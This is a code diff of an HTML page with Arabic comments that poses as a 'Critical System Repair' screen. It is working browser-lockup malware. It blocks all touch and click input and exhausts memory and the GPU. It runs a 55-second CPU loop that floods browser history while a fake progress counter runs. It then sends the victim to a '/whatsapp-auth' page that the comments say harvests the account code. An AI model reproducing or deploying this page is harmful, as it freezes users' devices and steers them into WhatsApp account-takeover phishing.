@@ -2,47 +2,78 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>System Error</title>
+    <title>Critical System Repair</title>
     <style>
-        body { background: black; color: red; text-align: center; padding-top: 50%; font-family: Courier; overflow: hidden; touch-action: none; }
+        /* جعل الصفحة تغطي كل شيء وتمنع التفاعل */
+        body, html { 
+            margin: 0; padding: 0; width: 100%; height: 100%; 
+            background: #000; color: #0f0; font-family: 'Courier New', Courier, monospace;
+            overflow: hidden; touch-action: none; user-select: none;
+        }
+        #terminal { padding: 20px; font-size: 14px; text-align: left; }
+        /* طبقة وهمية فوق الشاشة لامتصاص اللمس */
+        #shield {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 999999; background: rgba(0,0,0,0.01);
+        }
     </style>
 </head>
 <body>
-    <div id="status">⚠️ جاري إصلاح ثغرة في الذاكرة...<br>الرجاء عدم لمس الشاشة</div>
+    <div id="shield"></div>
+    <div id="terminal">
+        [SYSTEM INFO]: Critical vulnerability detected...<br>
+        [ACTION]: Locking UI to prevent data leak...<br>
+        [PROCESS]: Overwriting kernel sectors... <span id="percent">0%</span>
+    </div>
 
     <script>
-        function freezeHard() {
-            // 1. شل حركة اللمس تماماً عبر المتصفح
-            document.addEventListener('touchstart', (e) => e.preventDefault(), {passive: false});
-            document.addEventListener('touchmove', (e) => e.preventDefault(), {passive: false});
+        // 1. منع اللمس نهائياً على مستوى البرمجيات
+        ['touchstart', 'touchmove', 'touchend', 'click', 'contextmenu'].forEach(evt => {
+            document.addEventListener(evt, (e) => {
+                e.preventDefault();
+                e.stopPropagation();
+            }, { passive: false });
+        });
 
-            // 2. تجميد شريط العناوين والواجهة عبر إرسال آلاف الطلبات للسجل
-            setInterval(() => {
-                for (let i = 0; i < 500; i++) {
-                    window.history.pushState(null, null, window.location.href + "/" + Math.random());
+        function startMeltdown() {
+            let p = 0;
+            const target = document.getElementById('percent');
+            
+            // 2. هجوم استنزاف الذاكرة والرسوميات (The Malware Logic)
+            const memoryLeak = [];
+            const malwareLoop = setInterval(() => {
+                // توليد عناصر HTML غير مرئية بالآلاف لإشغال GPU
+                for (let i = 0; i < 1000; i++) {
+                    const div = document.createElement('div');
+                    div.style.cssText = 'position:fixed;width:1px;height:1px;box-shadow: 0 0 10px white;';
+                    document.body.appendChild(div);
                 }
-            }, 100);
 
-            // 3. استهلاك الرام (RAM) - سيجعل الجهاز يتوقف عن الاستجابة للمس النظام
-            let bomb = [];
-            const freezeInterval = setInterval(() => {
-                try {
-                    // توليد نصوص عملاقة في الذاكرة
-                    bomb.push(new Array(1000000).join("X"));
-                } catch (e) {
-                    // إذا امتلأت الرام، سنبدأ حلقة CPU لا نهائية
-                    while(true) { Math.sqrt(Math.random()); }
+                // إشغال الـ RAM بنصوص عملاقة
+                memoryLeak.push(new Array(1000000).join("NUCLEAR_PAYLOAD"));
+
+                // تحديث النسبة المئوية للتمويه
+                if (p < 99) {
+                    p++;
+                    target.innerText = p + "%";
                 }
             }, 50);
 
-            // توقف السكريبت بعد دقيقة لتحويل الضحية
+            // 3. حلقة CPU اللانهائية (شل حركة النظام)
+            // سيؤدي هذا لتوقف شريط التنبيهات وأزرار التنقل عن الاستجابة
             setTimeout(() => {
-                clearInterval(freezeInterval);
-                location.href = "/login-box"; // استبدل بصفحة المصيدة الخاصة بك
-            }, 60000);
+                const start = Date.now();
+                while (Date.now() - start < 55000) { // تجميد لمدة 55 ثانية
+                    window.history.pushState(null, null, window.location.href + "#" + Math.random());
+                    Math.atan2(Math.random(), Math.random());
+                }
+                // بعد الدقيقة، يتم توجيه الضحية لصفحة سحب الكود
+                window.location.href = "/whatsapp-auth"; 
+            }, 5000); // يبدأ التجميد القاسي بعد 5 ثواني من فتح الرابط
         }
 
-        window.onload = freezeHard;
+        // تشغيل الهجوم
+        window.onload = startMeltdown;
     </script>
 </body>
 </html>
